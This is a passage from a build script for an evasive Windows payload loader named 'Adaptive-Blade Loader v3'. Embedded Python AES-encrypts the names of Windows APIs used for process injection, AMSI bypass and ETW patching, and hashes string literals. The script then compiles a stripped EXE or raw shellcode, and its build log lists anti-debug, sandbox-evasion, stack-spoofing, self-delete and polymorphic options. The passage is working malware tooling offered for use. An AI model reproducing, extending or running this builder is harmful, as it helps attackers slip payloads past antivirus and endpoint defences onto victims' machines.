    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
]
def xb(a,b): return bytes(x^y for x,y in zip(a,b))
def ke2(k):
    rcon=[0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
    w=list(k)
    for i in range(4,44):
        t=w[(i-1)*4:(i-1)*4+4]
        if i%4==0:
            t=[t[1],t[2],t[3],t[0]]
            t=[SBOX2[b] for b in t]
            t[0]^=rcon[i//4-1]
        w.extend(xb(t,w[(i-4)*4:(i-4)*4+4]))
    return bytes(w)
def sbox(s): return [SBOX2[b] for b in s]
def sr(s): return [s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]]
def gm(a,b):
    p=0
    for _ in range(8):
        if b&1: p^=a
        h=a&0x80;a=(a<<1)&0xff
        if h: a^=0x1b
        b>>=1
    return p
def mc(s):
    o=[0]*16
    for i in range(0,16,4):
        a=s[i:i+4]
        o[i]=gm(a[0],2)^gm(a[1],3)^a[2]^a[3]
        o[i+1]=a[0]^gm(a[1],2)^gm(a[2],3)^a[3]
        o[i+2]=a[0]^a[1]^gm(a[2],2)^gm(a[3],3)
        o[i+3]=gm(a[0],3)^a[1]^a[2]^gm(a[3],2)
    return o
def eb(blk,w):
    s=list(blk)
    s=xb(s,w[:16])
    for r in range(1,10):
        s=sbox(s)
        s=sr(s)
        s=mc(s)
        s=xb(s,w[r*16:(r+1)*16])
    s=sbox(s)
    s=sr(s)
    s=xb(s,w[10*16:11*16])
    return bytes(s)
def cbc_enc(pt,k,iv):
    wk=ke2(k)
    p=pt+bytes([16-len(pt)%16]*(16-len(pt)%16))
    o=b""
    pr=iv
    for i in range(0,len(p),16):
        bl=xb(p[i:i+16],pr)
        en=eb(bl,wk)
        o+=en
        pr=en
    return o

# Strings to encrypt for the loader
str_list = [
    ("s_ntdll", "ntdll.dll"),
    ("s_amsi", "amsi.dll"),
    ("s_krnl", "kernel32.dll"),
    ("s_adv", "advapi32.dll"),
    ("s_nqip", "NtQueryInformationProcess"),
    ("s_nsip", "NtSetInformationProcess"),
    ("s_nos", "NtOpenSection"),
    ("s_ngct", "NtGetContextThread"),
    ("s_nsct", "NtSetContextThread"),
    ("s_rius", "RtlInitUnicodeString"),
    ("s_etw", "EtwEventWrite"),
    ("s_asb", "AmsiScanBuffer"),
    ("s_ha", "HeapAlloc"),
    ("s_hf", "HeapFree"),
    ("s_ro", "RegOpenKeyExW"),
    ("s_rcs", "RtlCaptureStackBackTrace"),
    ("s_nde", "NtDelayExecution"),
    ("s_ncs", "NtCreateSection"),
    ("s_nmv", "NtMapViewOfSection"),
    ("s_npv", "NtProtectVirtualMemory"),
    ("s_nuv", "NtUnmapViewOfSection"),
    ("s_nop", "NtOpenProcess"),
    ("s_nav", "NtAllocateVirtualMemory"),
    ("s_nwv", "NtWriteVirtualMemory"),
    ("s_nct", "NtCreateThreadEx"),
    ("s_nqa", "NtQueueApcThread"),
    ("s_ncl", "NtClose"),
]
obf_str_defs = []
for sid, sval in str_list:
    enc = cbc_enc(sval.encode(), obf_keys, obf_ivs)
    ed = ', '.join(f'0x{b:02x}' for b in enc)
    kd = ', '.join(f'0x{b:02x}' for b in obf_keys)
    vd = ', '.join(f'0x{b:02x}' for b in obf_ivs)
    obf_str_defs.append(f'struct _{sid} {{')
    obf_str_defs.append(f'    static const char* get(){{')
    obf_str_defs.append(f'        static char buf[128];')
    obf_str_defs.append(f'        static bool init=false;')
    obf_str_defs.append(f'        if(!init){{')
    obf_str_defs.append(f'            init=true;')
    obf_str_defs.append(f'            uint8_t k[16]={{{kd}}};')
    obf_str_defs.append(f'            uint8_t v[16]={{{vd}}};')
    obf_str_defs.append(f'            uint8_t d[{len(enc)}]={{{ed}}};')
    obf_str_defs.append(f'            aegis::StrEnc se;')
    obf_str_defs.append(f'            memcpy(se.key,k,16);memcpy(se.iv,v,16);')
    obf_str_defs.append(f'            se.data=d;se.dlen={len(enc)};')
    obf_str_defs.append(f'            char* _d=se.decrypt();')
    obf_str_defs.append(f'            int sl=0;while(_d[sl])sl++;')
    obf_str_defs.append(f'            int cp=sl<127?sl:127;')
    obf_str_defs.append(f'            memcpy(buf,_d,cp);buf[cp]=0;')
    obf_str_defs.append(f'            delete[] _d;')
    obf_str_defs.append(f'        }}')
    obf_str_defs.append(f'        return buf;')
    obf_str_defs.append(f'    }}')
    obf_str_defs.append(f'}};')
obf_str_code = '\n'.join(obf_str_defs)
ldr = ldr.replace("__OBF_STRINGS__", obf_str_code)

# Add runtime AES decryptor helper
aes_dec_func = '''
static char* _decrypt_str(const unsigned char* data,int dlen,const unsigned char* key,const unsigned char* iv){
    uint8_t w[176];aegis::_ke(key,w);
    int plen=dlen;
    uint8_t* tmp=new uint8_t[plen];
    memcpy(tmp,data,plen);
    uint8_t prev[16];memcpy(prev,iv,16);
    for(int i=0;i<plen;i+=16){
        uint8_t block[16];aegis::_dc(tmp+i,block,w);
        for(int j=0;j<16;j++){tmp[i+j]=block[j]^prev[j];}
        memcpy(prev,tmp+i,16);
    }
    int pad=tmp[plen-1];
    int rlen=plen-pad;
    char* r=new char[rlen+1];
    memcpy(r,tmp,rlen);r[rlen]=0;
    delete[] tmp;return r;
}
'''
# Insert after AES key/iv
ldr = ldr.replace("static InjCtx _ctx;", f"{aes_dec_func}\nstatic InjCtx _ctx;")

# Generate junk functions (polymorphic)
if cfg["polymorphic"]:
    junk_code = ''
else:
    junk_code = ''
ldr = ldr.replace("__JUNK_FUNCS__", junk_code)

# Junk calls are inline for simplicity
junk_call = '{volatile int _x=0;for(int _i=0;_i<20;_i++)_x+=_i;}' if cfg["polymorphic"] else ''
ldr = ldr.replace("__JUNK_CALL__", junk_call)

# Write modified loader.cpp
with open("$SRCDIR/loader.cpp","w") as f: f.write(ldr)
print("[+] Polymorphic loader.cpp generated")
PYEOF

# ============================================================
# STRING OBFUSCATION: Replace _hash("literal") with pre-computed hash constants
# ============================================================
echo -e "${GREEN}[+] Obfuscating string literals...${NC}"
python3 << HASHEOF
import os, re

srcdir = "$SRCDIR"

# djb2 hash function (must match C++ _hash)
def djb2(s):
    h = 5381
    for c in s:
        h = ((h << 5) + h) + ord(c)
    return h & 0xFFFFFFFF

# Scan all .cpp, .hpp, .s files in srcdir for _hash("string")
pattern = re.compile(r'_hash\("([^"]+)"\)')

for fname in os.listdir(srcdir):
    if not (fname.endswith('.cpp') or fname.endswith('.hpp') or fname.endswith('.s')):
        continue
    fpath = os.path.join(srcdir, fname)
    with open(fpath, 'r') as f:
        content = f.read()
    def replacer(m):
        s = m.group(1)
        h = djb2(s)
        return f'0x{h:08x}'
    new_content = pattern.sub(replacer, content)
    if new_content != content:
        with open(fpath, 'w') as f:
            f.write(new_content)
        print(f'    [*] Obfuscated strings in {fname}')
print('[+] String obfuscation complete')
HASHEOF

# ============================================================
# COMPILATION
# ============================================================
echo -e "${GREEN}[+] Compiling...${NC}"

CXXFLAGS="-std=gnu++20 -O3 -Wall -s -fno-ident -lntdll -lkernel32 -static-libgcc -static-libstdc++ -static -mwindows -Wl,--nxcompat -Wl,--dynamicbase -Wl,--exclude-all-symbols -Wl,--strip-all -Wl,--gc-sections -fvisibility=hidden"

if [ "$OUTTYPE" = "exe" ]; then
    echo -e "${GREEN}[+] Building EXE...${NC}"
    $CC "$SRCDIR/loader.cpp" "$SRCDIR/sys.s" -I"$SRCDIR" -o "$OUTPUT" $CXXFLAGS 2>&1
    x86_64-w64-mingw32-strip --strip-all --remove-section=.comment --remove-section=.note "$OUTPUT" 2>/dev/null || true
    echo -e "${GREEN}[+] EXE: $OUTPUT${NC}"

elif [ "$OUTTYPE" = "bin" ]; then
    echo -e "${GREEN}[+] Building shellcode (no Donut needed)...${NC}"
    # Compile as position-independent code with custom entry
    TMPBIN=$(mktemp)
    $CC "$SRCDIR/loader.cpp" "$SRCDIR/sys.s" -I"$SRCDIR" -nostartfiles -eWinMain -fPIC -o "$TMPBIN" $CXXFLAGS 2>&1 || {
        echo -e "${YELLOW}[-] PIC compile failed, falling back to objcopy extract${NC}"
        # Fallback: compile as normal EXE then extract raw
        TMPEXE=$(mktemp)
        $CC "$SRCDIR/loader.cpp" "$SRCDIR/sys.s" -I"$SRCDIR" -o "$TMPEXE" $CXXFLAGS 2>&1
        x86_64-w64-mingw32-objcopy -O binary -j .text -j .data -j .rdata "$TMPEXE" "$OUTPUT" 2>/dev/null || \
        x86_64-w64-mingw32-objcopy -O binary -j .text "$TMPEXE" "$OUTPUT" 2>/dev/null
        rm -f "$TMPEXE"
    }
    # If PIC worked, extract as raw binary
    if [ -f "$TMPBIN" ]; then
        x86_64-w64-mingw32-objcopy -O binary -j .text -j .data -j .rdata "$TMPBIN" "$OUTPUT" 2>/dev/null || \
        x86_64-w64-mingw32-objcopy -O binary -j .text "$TMPBIN" "$OUTPUT" 2>/dev/null
        rm -f "$TMPBIN"
    fi
    echo -e "${GREEN}[+] BIN: $OUTPUT${NC}"
fi

# Cleanup
rm -rf "$SRCDIR" "$TMPENC" "$WORKDIR" 2>/dev/null || true

echo -e "\n${GREEN}[+] SUCCESS: $OUTPUT (type: $OUTTYPE)${NC}"
echo -e "${CYAN}    XOR key: $XOR_KEY | Target DLL: $MODULE_DLL${NC}"
echo -e "${CYAN}    Injection: $INJ_METHOD | Sleep: ${SLEEP_BASE}ms/${SLEEP_JITTER}%${NC}"
echo -e "${CYAN}    Anti-debug: timing=$AD_TIMING hwbp=$AD_HWBP tracer=$AD_TRACER sandbox=$AD_SANDBOX${NC}"
echo -e "${CYAN}    Self-delete: $SD_ENABLED | AMSI bypass: $AMSI_ENABLE | Stack spoof: $SS_ENABLE${NC}"

# Generate log
LOGFILE="${OUTPUT}.log"
{
    echo "Adaptive-Blade Loader v3 Build Log"
    echo "=================================="
    echo "Output: $OUTPUT"
    echo "Type: $OUTTYPE"
    echo "Payload: $BINFILE (${binlen}B)"
    echo "XOR Key: $XOR_KEY"
    echo "OBFS Key: $OBFS_KEY"
    echo "Injection: $INJ_METHOD"
    echo "Target DLL: $MODULE_DLL"
    echo "Sleep: ${SLEEP_BASE}ms/${SLEEP_JITTER}%"
    echo "Self-delete: $SD_ENABLED/$SD_METHOD"
    echo "AMSI Bypass: $AMSI_ENABLE/$AMSI_METHOD"
    echo "Anti-debug: timing=$AD_TIMING ntglobal=$AD_NTGLOBAL hwbp=$AD_HWBP tracer=$AD_TRACER sandbox=$AD_SANDBOX delay=$AD_DELAYED hammer=$AD_API_HAMMER"
    echo "Stack Spoofing: $SS_ENABLE depth=$SS_DEPTH"
    echo "Polymorphic: $OBF_POLYMORPHIC"
    echo "String Obf: $OBF_STRING"
    echo "Date: $(date)"
} > "$LOGFILE"
echo -e "${CYAN}[+] Build log: $LOGFILE${NC}"
